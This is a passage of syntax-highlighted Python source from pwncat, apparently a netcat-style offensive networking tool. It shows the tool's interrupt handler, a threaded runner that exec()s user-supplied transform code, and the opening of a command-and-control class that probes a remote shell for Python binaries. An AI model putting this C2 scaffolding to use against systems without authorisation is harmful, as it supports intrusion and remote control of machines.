    as well as to ask the Interrupt Handler what to do.
    The Interrupt handler will internally decide (based on pwncat's
    command line arguments) what to do.
    """</span>

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Constructor</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span
            class="hljs-params">self, keep_open, no_shutdown</span>):</span>
        <span class="hljs-comment"># type: (bool, bool) -&gt; None</span>
        <span class="hljs-string">"""Instantiate InterruptHandler.

        Args:
            keep_open (bool): `--keep-open` command line argument.
            no_shutdown (bool): `--no-shutdown` command line argument.
        """</span>
        self.__log = logging.getLogger(__name__)  <span
                            class="hljs-comment"># type: logging.Logger</span>
        self.__keep_open = keep_open
        self.__no_shutdown = no_shutdown

        <span class="hljs-comment"># Shutdown signals</span>
        self.__terminate = <span class="hljs-literal">False</span>
        self.__sock_send_eof = <span class="hljs-literal">False</span>
        self.__sock_quit = <span class="hljs-literal">False</span>
        self.__stdin_quit = <span class="hljs-literal">False</span>
        self.__command_quit = <span class="hljs-literal">False</span>

        <span class="hljs-comment"># Producers have received EOF</span>
        self.__sock_eof = <span class="hljs-literal">False</span>
        self.__stdin_eof = <span class="hljs-literal">False</span>
        self.__command_eof = <span class="hljs-literal">False</span>

        <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">handler</span>(<span
                class="hljs-params">signum, frame</span>):</span>  <span class="hljs-comment"># type: ignore  # pylint: disable=unused-argument</span>
            self.__log.trace(<span class="hljs-string">"Ctrl+c caught."</span>)  <span
                            class="hljs-comment"># type: ignore</span>
            <span class="hljs-comment"># logging.shutdown()</span>
            self.raise_terminate()

        <span class="hljs-comment"># Handle Ctrl+C</span>
        <span class="hljs-comment"># signal.signal(signal.SIGTERM, handler)</span>
        signal.signal(signal.SIGINT, handler)

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Ask for action</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">has_terminate</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; bool</span>
        <span class="hljs-string">"""`bool`: Switch to be checked if pwncat should be terminated."""</span>
        <span class="hljs-keyword">return</span> self.__terminate

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">has_sock_send_eof</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; bool</span>
        <span class="hljs-string">"""`bool`: Switch to be checked if the socket connection should be closed for sending."""</span>
        <span class="hljs-keyword">return</span> self.__sock_send_eof

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">has_sock_quit</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; bool</span>
        <span class="hljs-string">"""`bool`: Switch to be checked if the socket connection should be closed."""</span>
        <span class="hljs-keyword">return</span> self.__sock_quit

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">has_stdin_quit</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; bool</span>
        <span class="hljs-string">"""`bool`: Switch to be checked if the STDIN should be closed."""</span>
        <span class="hljs-keyword">return</span> self.__stdin_quit

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">has_command_quit</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; bool</span>
        <span class="hljs-string">"""`bool`: Switch to be checked if the command should be closed."""</span>
        <span class="hljs-keyword">return</span> self.__command_quit

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Raise Termination signal</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">raise_terminate</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; None</span>
        <span class="hljs-string">"""Signal the application that Socket should be quit."""</span>
        self.__log.trace(<span class="hljs-string">"SIGNAL TERMINATE raised"</span>)  <span
                            class="hljs-comment"># type: ignore</span>
        self.__terminate = <span class="hljs-literal">True</span>
        self.__sock_quit = <span class="hljs-literal">True</span>
        self.__stdin_quit = <span class="hljs-literal">True</span>
        self.__command_quit = <span class="hljs-literal">True</span>

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Raise Socket signals</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">raise_sock_send_eof</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; None</span>
        <span class="hljs-string">"""Signal the application that Socket should be closed for sending."""</span>
        <span class="hljs-comment"># self.__log.trace("SIGNAL SOCK-CLOSE-SEND raised")  # type: ignore</span>
        self.__sock_send_eof = <span class="hljs-literal">True</span>

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">raise_sock_eof</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; None</span>
        <span class="hljs-string">"""Signal the application that Socket has received EOF."""</span>
        <span class="hljs-comment"># self.__log.trace("SIGNAL SOCK-EOF raised")  # type: ignore</span>
        self.__sock_eof = <span class="hljs-literal">True</span>
        self.raise_sock_quit()

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">raise_sock_quit</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; None</span>
        <span class="hljs-string">"""Signal the application that Socket should be quit."""</span>
        <span class="hljs-comment"># self.__log.trace("SIGNAL SOCK-QUIT raised")  # type: ignore</span>
        self.__sock_quit = <span class="hljs-literal">True</span>
        self.raise_terminate()

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Raise STDIN signals</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">raise_stdin_eof</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; None</span>
        <span class="hljs-string">"""Signal the application that STDIN has received EOF."""</span>
        <span class="hljs-comment"># self.__log.trace("SIGNAL STDIN-EOF raised")  # type: ignore</span>
        self.__stdin_eof = <span class="hljs-literal">True</span>
        self.raise_stdin_quit()

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">raise_stdin_quit</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; None</span>
        <span class="hljs-string">"""Signal the application that STDIN should be quit."""</span>
        <span class="hljs-comment"># self.__log.trace("SIGNAL STDIN-QUIT raised")  # type: ignore</span>
        self.__stdin_quit = <span class="hljs-literal">True</span>
        <span class="hljs-comment"># If --no-shutdown or -keep-open is specified</span>
        <span class="hljs-comment"># pwncat will not invoke shutdown on a socket after seeing EOF on stdin</span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> (self.__no_shutdown <span
                            class="hljs-keyword">or</span> self.__keep_open):
            <span class="hljs-comment"># No more data from stdin, we can tell the remote side we are done</span>
            <span class="hljs-comment"># by closing the socket for sending (they will receive an EOF).</span>
            self.raise_sock_send_eof()

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Raise COMMAND signals</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">raise_command_eof</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; None</span>
        <span class="hljs-string">"""Signal the application that Command has received EOF."""</span>
        <span class="hljs-comment"># self.__log.trace("SIGNAL COMMAND-EOF raised")  # type: ignore</span>
        self.__command_eof = <span class="hljs-literal">True</span>
        self.raise_command_quit()

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">raise_command_quit</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; None</span>
        <span class="hljs-string">"""Signal the application that Command should be quit."""</span>
        <span class="hljs-comment"># self.__log.trace("SIGNAL COMMAND-QUIT raised")  # type: ignore</span>
        self.__command_quit = <span class="hljs-literal">True</span>
        self.raise_terminate()


<span class="hljs-comment"># -------------------------------------------------------------------------------------------------</span>
<span class="hljs-comment"># [8/11 IO RUNNER]: (2/2) Runner</span>
<span class="hljs-comment"># -------------------------------------------------------------------------------------------------</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span
        class="hljs-title">Runner</span>(<span class="hljs-params">object</span>):</span>
    <span class="hljs-string">"""Runner class that takes care about putting everything into threads."""</span>

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Constructor / Destructor</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span
            class="hljs-params">self, ssig, fast_quit, pse</span>):</span>
        <span class="hljs-comment"># type: (InterruptHandler, bool, PSEStore) -&gt; None</span>
        <span class="hljs-string">"""Create a new Runner object.

        Args:
            ssig (InterruptHandler): Instance of InterruptHandler.
            fast_quit (boo): On `True` do not join threads upon exit, just raise terminate and exit.
            pse (PSEStore): Pwncat Scripting Engine store.
        """</span>
        self.log = logging.getLogger(__name__)

        <span class="hljs-comment"># Dict of producer/consumer action to run in a thread.</span>
        <span class="hljs-comment"># Each list item will be run in its own thread</span>
        self.__actions = {}  <span class="hljs-comment"># type: Dict[str, DsRunnerAction]</span>

        <span class="hljs-comment"># Dict of timed function definition to run in a thread.</span>
        <span class="hljs-comment"># Each list item will be run in its own thread.</span>
        self.__timers = {}  <span class="hljs-comment"># type: Dict[str, DsRunnerTimer]</span>

        <span class="hljs-comment"># Dict of repeater function definition to run in a thread.</span>
        <span class="hljs-comment"># Each list item will be run in its own thread.</span>
        self.__repeaters = {}  <span class="hljs-comment"># type: Dict[str, DsRunnerRepeater]</span>

        <span class="hljs-comment"># A dict which holds the threads created from actions.</span>
        <span class="hljs-comment"># The name is based on the __actions name</span>
        <span class="hljs-comment"># {"name": "&lt;thread&gt;"}</span>
        self.__threads = {}  <span class="hljs-comment"># type: Dict[str, threading.Thread]</span>

        self.__ssig = ssig
        self.__fast_quit = fast_quit
        self.__pse = pse

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Public Functions</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add_action</span>(<span
            class="hljs-params">self, name, action</span>):</span>
        <span class="hljs-comment"># type: (str, DsRunnerAction) -&gt; None</span>
        <span class="hljs-string">"""Add a function to the producer/consumer thread pool runner.

        Args:
            name (str): The name for the added action (will be used for logging the tread name).
            action (DsRunnerAction): Instance of DSRunnerAction.
        """</span>
        self.__actions[name] = action

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add_timer</span>(<span
            class="hljs-params">self, name, timer</span>):</span>
        <span class="hljs-comment"># type: (str, DsRunnerTimer) -&gt; None</span>
        <span class="hljs-string">"""Add a function to the timer thread pool runner.

        Args:
            name (str): The name for the added timer (will be used for logging the thread name).
            timer (DsRunnerTimer): Instance of DsRunnerTimer.
        """</span>
        self.__timers[name] = timer

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add_repeater</span>(<span
            class="hljs-params">self, name, repeater</span>):</span>
        <span class="hljs-comment"># type: (str, DsRunnerRepeater) -&gt; None</span>
        <span class="hljs-string">"""Add a function to the repeater thread pool runner.

        Args:
            name (str): The name for the added repeater (will be used for logging the thread name).
            repeater (DsRunnerRepeater): Instance of DsRunnerRepeater.
        """</span>
        self.__repeaters[name] = repeater

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span
            class="hljs-title">run</span>(<span class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; None</span>
        <span class="hljs-string">"""Run threaded pwncat I/O modules."""</span>

        <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run_action</span>(<span
                class="hljs-params">
            name,  <span class="hljs-comment"># type: str</span>
            producer,  <span class="hljs-comment"># type: DsCallableProducer</span>
            consumer,  <span class="hljs-comment"># type: Callable[[bytes], None]</span>
            transformers,  <span class="hljs-comment"># type: List[Transform]</span>
            code,  <span class="hljs-comment"># type: Optional[Union[str, bytes, CodeType]]</span>
        </span>):</span>
            <span class="hljs-comment"># type: (...) -&gt; None</span>
            <span class="hljs-string">"""Producer/consumer run function to be thrown into a thread.

            Args:
                name (str): Name for logging output.
                producer (function): A generator function which yields data.
                consumer (function): A callback which consumes data from the generator.
                transformers ([function]): List of transformer functions applied before consumer.
                code (ast.AST): User-supplied python code with a transform(data) -&gt; str function.
            """</span>
            self.log.trace(<span class="hljs-string">"[%s] Producer Start"</span>, name)  <span
                            class="hljs-comment"># type: ignore</span>
            <span class="hljs-keyword">for</span> data <span class="hljs-keyword">in</span> producer.function(*producer.args, **producer.kwargs):
                self.log.trace(<span class="hljs-string">"[%s] Producer received: %s"</span>, name, repr(data))  <span
                            class="hljs-comment"># type: ignore</span>

                <span class="hljs-comment"># [1/3] Transform data before sending it to the consumer</span>
                <span class="hljs-keyword">if</span> transformers:
                    <span class="hljs-keyword">for</span> transformer <span
                            class="hljs-keyword">in</span> transformers:
                        data = transformer.transform(data)
                    self.log.trace(  <span class="hljs-comment"># type: ignore</span>
                        <span class="hljs-string">"[%s] Producer data after transformers: %s"</span>, name, repr(data)
                    )

                <span class="hljs-comment"># [2/3] Apply custom user-supplied code transformations</span>
                <span class="hljs-keyword">if</span> code <span class="hljs-keyword">is</span> <span
                            class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:
                    self.log.debug(
                        <span class="hljs-string">"[%s] Executing user supplied transform(data, pse) -&gt; data function"</span>, name
                    )
                    pse = self.__pse
                    <span class="hljs-comment"># Add current message to PSE store</span>
                    <span class="hljs-keyword">if</span> name <span class="hljs-keyword">in</span> self.__pse.messages:
                        self.__pse.messages[name] = self.__pse.messages[name] + [data]
                    <span class="hljs-keyword">else</span>:
                        self.__pse.messages[name] = [data]
                    <span class="hljs-comment"># Execute script code</span>
                    exec(code, {}, locals())  <span
                            class="hljs-comment"># pylint: disable=exec-used</span>
                    data = locals()[<span class="hljs-string">"transform"</span>](data, pse)

                    self.log.trace(  <span class="hljs-comment"># type: ignore</span>
                        <span class="hljs-string">"[%s] Producer data after user supplied transformer: %s"</span>, name, repr(data)
                    )

                <span class="hljs-comment"># [3/3] Consume it</span>
                consumer(data)
            self.log.trace(<span class="hljs-string">"[%s] Producer Stop"</span>, name)  <span
                            class="hljs-comment"># type: ignore</span>

        <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run_timer</span>(<span
                class="hljs-params">name, action, intvl, ssig, *args, **kwargs</span>):</span>
            <span class="hljs-comment"># type: (str, Callable[..., None], int, InterruptHandler, Any, Any) -&gt; None</span>
            <span class="hljs-string">"""Timer run function to be thrown into a thread (Execs periodic tasks).

            Args:
                name (str):        Name for logging output
                action (function): Function to be called in a given intervall
                intvl (float):     Intervall at which the action function will be called
                ssig (InterruptHandler): Instance of InterruptHandler
                args (*args):      *args for action func
                kwargs (**kwargs): **kwargs for action func
            """</span>
            self.log.trace(<span class="hljs-string">"[%s] Timer Start (exec every %f sec)"</span>, name, intvl)  <span
                            class="hljs-comment"># type: ignore</span>
            time_last = int(time.time())
            <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
                <span class="hljs-keyword">if</span> ssig.has_terminate():
                    self.log.trace(  <span class="hljs-comment"># type: ignore</span>
                        <span class="hljs-string">"TERMINATE signal ACK for timer action [%s]"</span>, name
                    )
                    <span class="hljs-keyword">return</span>
                time_now = int(time.time())
                <span class="hljs-keyword">if</span> time_now &gt; time_last + intvl:
                    self.log.debug(<span class="hljs-string">"[%s] Executing timed function"</span>, time_now)
                    action(*args, **kwargs)
                    time_last = time_now  <span class="hljs-comment"># Reset previous time</span>
                time.sleep(<span class="hljs-number">0.1</span>)

        <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run_repeater</span>(<span
                class="hljs-params">name, action, repeat, pause, ssig, *args, **kwargs</span>):</span>
            <span class="hljs-comment"># type: (str, Callable[..., None], int, float, InterruptHandler, Any, Any) -&gt; None</span>
            <span class="hljs-string">"""Repeater run function to be thrown into a thread (Execs periodic tasks).

            Args:
                name (str):        Name for logging output
                action (function): Function to be called
                repeat (int):      Repeat the function so many times before quitting
                pause (float):     Pause between repeated calls
                ssig (InterruptHandler): Instance of InterruptHandler
                args (*args):      *args for action func
                kwargs (**kwargs): **kwargs for action func
            """</span>
            cycles = <span class="hljs-number">1</span>
            self.log.trace(<span class="hljs-string">"Repeater Start (%d/%d)"</span>, cycles, repeat)  <span
                            class="hljs-comment"># type: ignore</span>
            <span class="hljs-keyword">while</span> cycles &lt;= repeat:
                <span class="hljs-keyword">if</span> ssig.has_terminate():
                    self.log.trace(  <span class="hljs-comment"># type: ignore</span>
                        <span class="hljs-string">"TERMINATE signal ACK for repeater action [%s]"</span>, name
                    )
                    <span class="hljs-keyword">return</span>
                self.log.debug(<span
                            class="hljs-string">"Executing repeated function (%d/%d)"</span>, cycles, repeat)
                action(*args, **kwargs)
                cycles += <span class="hljs-number">1</span>
                time.sleep(pause)

        <span class="hljs-comment"># [1/3] Start available action in a thread</span>
        <span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> self.__actions:
            <span class="hljs-keyword">if</span> self.__ssig.has_terminate():
                self.log.trace(<span class="hljs-string">"TERMINATE signal ACK for Runner.run [1]: [%s]"</span>, key)  <span
                            class="hljs-comment"># type: ignore</span>
                <span class="hljs-keyword">break</span>
            <span class="hljs-comment"># Create Thread object</span>
            thread = threading.Thread(
                target=run_action,
                name=key,
                args=(
                    key,
                    self.__actions[key].producer,
                    self.__actions[key].consumer,
                    self.__actions[key].transformers,
                    self.__actions[key].code,
                ),
            )
            <span class="hljs-comment"># Daemon threads are easier to kill</span>
            thread.daemon = self.__actions[key].daemon_thread

            <span class="hljs-comment"># Add delay if threads cannot be started</span>
            delay = <span class="hljs-number">0.0</span>
            <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
                <span class="hljs-keyword">if</span> self.__ssig.has_terminate():
                    self.log.trace(  <span class="hljs-comment"># type: ignore</span>
                        <span class="hljs-string">"TERMINATE signal ACK for Runner.run [2]: [%s]"</span>, key
                    )
                    <span class="hljs-keyword">break</span>
                <span class="hljs-keyword">try</span>:
                    <span class="hljs-comment"># Do not call any logging functions in here as it will</span>
                    <span class="hljs-comment"># cause a deadlock for Python2</span>
                    <span class="hljs-comment"># Start and break the loop upon success to go to the next thread to start</span>
                    thread.start()
                    <span class="hljs-keyword">break</span>
                <span class="hljs-keyword">except</span> (RuntimeError, Exception):  <span
                            class="hljs-comment"># pylint: disable=broad-except</span>
                    delay += <span class="hljs-number">0.1</span>
                    time.sleep(delay)  <span class="hljs-comment"># Give the system some time to release open fd's</span>
            self.__threads[key] = thread

        <span class="hljs-comment"># [2/3] Start available timers in a thread</span>
        <span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> self.__timers:
            <span class="hljs-keyword">if</span> self.__ssig.has_terminate():
                self.log.trace(<span class="hljs-string">"TERMINATE signal ACK for Runner.run [2]: [%s]"</span>, key)  <span
                            class="hljs-comment"># type: ignore</span>
                <span class="hljs-keyword">break</span>
            <span class="hljs-comment"># Create Thread object</span>
            thread = threading.Thread(
                target=run_timer,
                name=key,
                args=(
                    key,
                    self.__timers[key].action,
                    self.__timers[key].intvl,
                    self.__timers[key].ssig,
                )
                + self.__timers[key].args,
                kwargs=self.__timers[key].kwargs,
            )
            thread.daemon = <span class="hljs-literal">False</span>
            thread.start()

        <span class="hljs-comment"># [3/3] Start available repeaters in a thread</span>
        <span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> self.__repeaters:
            <span class="hljs-keyword">if</span> self.__ssig.has_terminate():
                self.log.trace(<span class="hljs-string">"TERMINATE signal ACK for Runner.run [3]: [%s]"</span>, key)  <span
                            class="hljs-comment"># type: ignore</span>
                <span class="hljs-keyword">break</span>
            <span class="hljs-comment"># Create Thread object</span>
            thread = threading.Thread(
                target=run_repeater,
                name=key,
                args=(
                    key,
                    self.__repeaters[key].action,
                    self.__repeaters[key].repeat,
                    self.__repeaters[key].pause,
                    self.__repeaters[key].ssig,
                )
                + self.__repeaters[key].args,
                kwargs=self.__repeaters[key].kwargs,
            )
            thread.daemon = <span class="hljs-literal">False</span>
            thread.start()

        <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">check_stop</span>():</span>
            <span class="hljs-comment"># type: () -&gt; bool</span>
            <span class="hljs-string">"""Stop threads."""</span>
            <span class="hljs-comment"># [1/2] Fast shutdown</span>
            <span class="hljs-comment"># For Python &lt; 3.3 we are unable to detect Ctrl+c signal during thread.join()</span>
            <span class="hljs-comment"># in a fast loop. Also for port-scan we will have thousands of threads that need</span>
            <span class="hljs-comment"># to be joined and the signal handler is unable to abort the whole program during that</span>
            <span class="hljs-comment"># time. Outcome is it would take a few minutes to abort during port scan.</span>
            <span class="hljs-comment"># The fix is to use a "faster" method to kill the threads.</span>
            <span class="hljs-comment"># 1. The port scanner threads need to be started in daemon mode</span>
            <span class="hljs-comment"># 2. the fast_quit param to Runner() must be set to True</span>
            <span class="hljs-keyword">if</span> self.__fast_quit:
                <span class="hljs-keyword">if</span> self.__ssig.has_terminate():
                    self.log.trace(<span
                            class="hljs-string">"Fast quit - shutting down."</span>)  <span
                            class="hljs-comment"># type: ignore</span>
                    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>

            <span class="hljs-comment"># [2/2] Normal shutdown for non-daemon threads</span>
            <span class="hljs-keyword">else</span>:
                <span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> self.__threads:
                    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.__threads[key].is_alive() <span
                            class="hljs-keyword">or</span> self.__ssig.has_terminate():
                        <span class="hljs-keyword">for</span> interrupt <span class="hljs-keyword">in</span> self.__actions[key].interrupts:
                            <span class="hljs-comment"># [1/3] Call external interrupters</span>
                            self.log.trace(  <span class="hljs-comment"># type: ignore</span>
                                <span class="hljs-string">"Call INTERRUPT: %s.%s() for %s"</span>,
                                getattr(interrupt, <span class="hljs-string">"__self__"</span>).__class__.__name__,
                                interrupt.__name__,
                                self.__threads[key].getName(),
                            )
                            interrupt()
                            <span class="hljs-comment"># [2/3] All blocking events inside the threads are gone, now join them</span>
                            <span class="hljs-keyword">try</span>:
                                self.log.trace(  <span class="hljs-comment"># type: ignore</span>
                                    <span class="hljs-string">"Joining %s"</span>, self.__threads[key].getName()
                                )
                                <span class="hljs-comment"># <span class="hljs-doctag">NOTE:</span> The thread.join() operating will also block the signal</span>
                                <span class="hljs-comment"># handler if we try to join too many threads at once.</span>
                                self.__threads[key].join()
                                self.log.trace(  <span class="hljs-comment"># type: ignore</span>
                                    <span class="hljs-string">"Joined %s"</span>, self.__threads[key].getName()
                                )
                            <span class="hljs-keyword">except</span> RuntimeError:
                                <span class="hljs-keyword">pass</span>
            <span class="hljs-comment"># If all threads are done, also stop</span>
            <span class="hljs-keyword">if</span> all([<span class="hljs-keyword">not</span> self.__threads[key].is_alive() <span
                            class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> self.__threads]):
                self.log.trace(<span class="hljs-string">"All threads dead - shutting down."</span>)  <span
                            class="hljs-comment"># type: ignore</span>
                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
            <span class="hljs-keyword">if</span> check_stop():
                sys.exit(<span class="hljs-number">0</span>)
            <span class="hljs-comment"># Need a timeout to not skyrocket the CPU</span>
            <span class="hljs-keyword">if</span> sys.version_info &lt; (<span
                            class="hljs-number">3</span>, <span class="hljs-number">3</span>):
                <span class="hljs-comment"># Signal Handler in Python &lt; 3.3 is broken and might not catch on</span>
                <span class="hljs-comment"># a too small timeout invervall</span>
                time.sleep(<span class="hljs-number">0.5</span>)
            <span class="hljs-keyword">else</span>:
                time.sleep(<span class="hljs-number">0.01</span>)


<span class="hljs-comment"># #################################################################################################</span>
<span class="hljs-comment"># #################################################################################################</span>
<span class="hljs-comment"># ###</span>
<span class="hljs-comment"># ###   9 / 11   C O M M A N D   A N D   C O N T R O L   M O D U L E S</span>
<span class="hljs-comment"># ###</span>
<span class="hljs-comment"># #################################################################################################</span>
<span class="hljs-comment"># #################################################################################################</span>

<span class="hljs-comment"># -------------------------------------------------------------------------------------------------</span>
<span class="hljs-comment"># [9/11 Command &amp; Control]: (1/3) CNC Exception classes</span>
<span class="hljs-comment"># -------------------------------------------------------------------------------------------------</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CNCPythonNotFound</span>(<span
        class="hljs-params">BaseException</span>):</span>
    <span class="hljs-string">"""CNC Exception handler."""</span>


<span class="hljs-comment"># -------------------------------------------------------------------------------------------------</span>
<span class="hljs-comment"># [9/11 Command &amp; Control]: (2/3) CNC</span>
<span class="hljs-comment"># -------------------------------------------------------------------------------------------------</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CNC</span>(<span
        class="hljs-params">object</span>):</span>
    <span class="hljs-string">"""Command and Control base class."""</span>

    __PYTHON_PATHS = [
        <span class="hljs-string">"/usr/bin"</span>,
        <span class="hljs-string">"/usr/local/bin"</span>,
        <span class="hljs-string">"/usr/local/python/bin"</span>,
        <span class="hljs-string">"/usr/local/python2/bin"</span>,
        <span class="hljs-string">"/usr/local/python2.7/bin"</span>,
        <span class="hljs-string">"/usr/local/python3/bin"</span>,
        <span class="hljs-string">"/usr/local/python3.5/bin"</span>,
        <span class="hljs-string">"/usr/local/python3.6/bin"</span>,
        <span class="hljs-string">"/usr/local/python3.7/bin"</span>,
        <span class="hljs-string">"/usr/local/python3.8/bin"</span>,
        <span class="hljs-string">"/bin"</span>,
        <span class="hljs-string">"/opt/bin"</span>,
        <span class="hljs-string">"/opt/python/bin"</span>,
        <span class="hljs-string">"/opt/python2/bin"</span>,
        <span class="hljs-string">"/opt/python2.7/bin"</span>,
        <span class="hljs-string">"/opt/python3/bin"</span>,
        <span class="hljs-string">"/opt/python3.5/bin"</span>,
        <span class="hljs-string">"/opt/python3.6/bin"</span>,
        <span class="hljs-string">"/opt/python3.7/bin"</span>,
        <span class="hljs-string">"/opt/python3.8/bin"</span>,
    ]

    __PYTHON_NAMES = [
        <span class="hljs-string">"python3"</span>,
        <span class="hljs-string">"python"</span>,
        <span class="hljs-string">"python2"</span>,
        <span class="hljs-string">"python2.7"</span>,
        <span class="hljs-string">"python3.5"</span>,
        <span class="hljs-string">"python3.6"</span>,
        <span class="hljs-string">"python3.7"</span>,
        <span class="hljs-string">"python3.8"</span>,
    ]

    __COLORS = {<span class="hljs-string">"yellow"</span>: <span
                            class="hljs-string">"\x1b[33;21m"</span>, <span class="hljs-string">"reset"</span>: <span
                            class="hljs-string">"\x1b[0m"</span>}

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Properties</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">remote_python</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; str</span>
        <span class="hljs-string">"""Discovered absolute Python remote path."""</span>
        <span class="hljs-keyword">return</span> self.__remote_python

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">remote_py3</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; bool</span>
        <span class="hljs-string">"""Is remote version Python3? Else it is Python2."""</span>
        <span class="hljs-keyword">return</span> self.__remote_py3

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Constructor</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span
            class="hljs-params">self, network</span>):</span>
        <span class="hljs-comment"># type: (IONetwork) -&gt; None</span>
        <span class="hljs-string">"""Instantiate Command and Control class.

        Args:
            network (IONetwork): Instance of IONetwork

        Raises:
            CNCPythonNotFound: if remote Python binary path is not found.
        """</span>
        self.__net = network
        self.__log = logging.getLogger(__name__)
        self.__py3 = sys.version_info &gt;= (<span class="hljs-number">3</span>, <span
                            class="hljs-number">0</span>)  <span
                            class="hljs-comment"># type: bool</span>

        <span class="hljs-comment"># Along with the response the server might prefix/suffix data</span>
        <span class="hljs-comment"># such as a PS1 prompt (which might be send first or last with a newline)</span>
        self.__remote_prefix = []  <span class="hljs-comment"># type: List[bytes]</span>
        self.__remote_suffix = []  <span class="hljs-comment"># type: List[bytes]</span>

        <span class="hljs-comment"># Receive timeout value will be adjusted dynamically depending on the</span>
        <span class="hljs-comment"># speed of the server. We'll start high to allow for slow servers.</span>
        self.__recv_timeout = <span class="hljs-number">0.3</span>
        self.__recv_rounds = <span class="hljs-number">5</span>
        self.__recv_times = []  <span class="hljs-comment"># type: List[float]</span>

        <span class="hljs-comment"># [1/3] Check if there is data to be received first (e.g.: greeting)</span>
        self.print_info(<span class="hljs-string">"Checking if remote sends greeting..."</span>)
